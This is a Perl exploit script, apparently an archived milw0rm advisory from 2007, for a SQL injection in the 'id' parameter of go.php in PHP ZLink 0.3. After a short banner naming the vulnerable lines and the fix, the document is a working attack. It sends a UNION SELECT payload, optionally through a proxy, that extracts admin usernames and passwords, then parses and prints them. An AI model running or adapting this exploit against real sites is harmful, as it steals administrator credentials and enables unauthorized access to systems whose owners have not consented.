<html><head><title>PHP ZLink 0.3 (go.php) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;

if(!$ARGV[3])
{
  print &quot;\n                         \\#'#/                    &quot;;
  print &quot;\n                         (-.-)                     &quot;;
  print &quot;\n   -----------------oOO---(_)---OOo----------------&quot;;
  print &quot;\n   | PHP ZLink v0.3 (go.php) Remote SQL Injection |&quot;;
  print &quot;\n   |                 coded by DNX                 |&quot;;
  print &quot;\n   ------------------------------------------------&quot;;
  print &quot;\n[!] Discovered.: DNX&quot;;
  print &quot;\n[!] Vendor.....: http://www.zeak.net&quot;;
  print &quot;\n[!] Detected...: 28.10.2007&quot;;
  print &quot;\n[!] Reported...: 28.10.2007&quot;;
  print &quot;\n[!] Response...: 29.10.2007&quot;;
  print &quot;\n&quot;;
  print &quot;\n[!] Background.: PHP ZLink is a free short Url Redirection Script&quot;;
  print &quot;\n&quot;;
  print &quot;\n[!] Bug........: \$id in go.php&quot;;
  print &quot;\n&quot;;
  print &quot;\n                 line 25: \$id = \$_GET['id']&quot;;
  print &quot;\n&quot;;
  print &quot;\n                 line 28: SELECT url FROM \$table WHERE id = \$id&quot;;
  print &quot;\n&quot;;
  print &quot;\n[!] Solution...: Upgrade to PHP ZLink v1.0&quot;;
  print &quot;\n&quot;;
  print &quot;\n[!] Usage......: perl zlink.pl [Host] [Path] &lt;Options&gt;&quot;;
  print &quot;\n[!] Example....: perl zlink.pl 127.0.0.1 /zlink/ -id 1&quot;;
  print &quot;\n[!] Options....:&quot;;
  print &quot;\n       -id [no]      Valid ID&quot;;
  print &quot;\n       -p [ip:port]  Proxy support&quot;;
  print &quot;\n&quot;;
  exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $table   = &quot;admin&quot;;
my $id      = 0;
my %options = ();
GetOptions(\%options, &quot;id=i&quot;, &quot;p=s&quot;);

print &quot;[!] Exploiting...\n&quot;;

if($options{&quot;id&quot;})
{
  exploit($options{&quot;id&quot;});
}
else
{
  print &quot;[!] Exploit failed, missing parameter\n&quot;;
  exit;
}

print &quot;\n[!] Exploit done\n&quot;;

sub exploit
{
  my $id     = shift;
  my $url    = &quot;http://&quot;.$host.$path.&quot;go.php?id=&quot;.$id.&quot;%20union%20select%20concat(username,0x2f,password)%20from%20admin&quot;;
  my $regexp = &quot;&lt;iframe(.*)src=\&quot;(.*)\&quot;&gt;&lt;\/iframe&gt;&quot;;
  
  my $ua = LWP::UserAgent-&gt;new;
  
  if($options{&quot;p&quot;})
  {
    $ua-&gt;proxy('http', &quot;http://&quot;.$options{&quot;p&quot;});
  }
  
  my $response = $ua-&gt;get($url);
  my $content = $response-&gt;content;
  @content = split(/\n/, $content);
  $found = 0;
  
  foreach (@content)
  {
    if($_ =~ /$regexp/ &amp;&amp; $2 !~ /http/)
    {
      ($user, $pass) = split(/\//, $2);
      print &quot;User/Password: &quot;.$user.&quot;/&quot;.$pass.&quot;\n&quot;;
      $found = 1;
    }
  }
  
  if(!$found)
  {
    $count = 2;
    $noendless = 20;
    while($count &lt; $noendless)
    {
      $response = $ua-&gt;get($url.&quot;%20limit%20&quot;.$count++);
      if($tmp eq $response-&gt;base)
      {
        $count = $noendless;
      }
      else
      {        
        $tmp = $response-&gt;base;
        ($x, $y) = split(/$host$path/, $tmp);
        print &quot;User/Password: &quot;.$y.&quot;\n&quot;;
      }
    }
  }
}

# milw0rm.com [2007-12-23]</pre></html>